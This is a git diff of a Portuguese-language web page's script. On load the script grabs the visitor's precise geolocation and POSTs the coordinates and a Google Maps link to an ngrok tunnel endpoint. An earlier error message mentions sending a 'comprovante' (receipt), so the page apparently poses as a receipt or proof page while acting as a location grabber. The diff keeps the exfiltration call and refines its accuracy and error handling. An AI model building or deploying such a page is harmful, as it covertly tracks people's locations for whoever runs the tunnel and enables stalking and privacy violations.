@@ -29,52 +29,70 @@
   </div>
 
   <script>
-    window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
-      }
+  window.addEventListener("load", () => {
+    if (!navigator.geolocation) {
+      alert("Geolocalização não é suportada pelo navegador.");
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
     });
+  });
 
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
+  const dataAtual = new Date();
+  const dia = String(dataAtual.getDate()).padStart(2, '0');
+  const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+  const ano = dataAtual.getFullYear();
+  const dataFormatada = `${dia}/${mes}/${ano}`;
+  document.getElementById("data-atual").textContent = dataFormatada;
 
-    const dataFormatada = `${dia}/${mes}/${ano}`;
+  function sendLocation(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+    const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-    document.getElementById("data-atual").textContent = dataFormatada;
+    console.log("Enviando localização:", { latitude, longitude, maps });
 
-    console.log(dataAtual)
-
-    function sendLocation(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      fetch("https://1e2746f31e5a.ngrok-free.app/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ latitude, longitude, maps })
+    fetch("https://1e2746f31e5a.ngrok-free.app/send-location", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ latitude, longitude, maps })
+    })
+      .then(res => res.json())
+      .then(data => {
+        if (data.success) {
+          console.log("Localização enviada com sucesso.");
+        } else {
+          alert("Erro ao enviar a localização.");
+          console.error("Erro no back-end:", data);
+        }
       })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
-        })
-        .catch(error => {
-          console.error("Erro:", error);
-        });
-    }
+      .catch(error => {
+        alert("Erro ao enviar a localização.");
+        console.error("Erro na requisição:", error);
+      });
+  }
 
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
+  function handleError(error) {
+    let message = "Erro desconhecido.";
+    switch (error.code) {
+      case error.PERMISSION_DENIED:
+        message = "Permissão de localização negada.";
+        break;
+      case error.POSITION_UNAVAILABLE:
+        message = "Localização indisponível.";
+        break;
+      case error.TIMEOUT:
+        message = "Tempo esgotado para obter localização.";
+        break;
     }
-  </script>
+    alert(message);
+    console.warn("Erro de geolocalização:", error.message);
+  }
+</script>
 </body>
 
 </html>
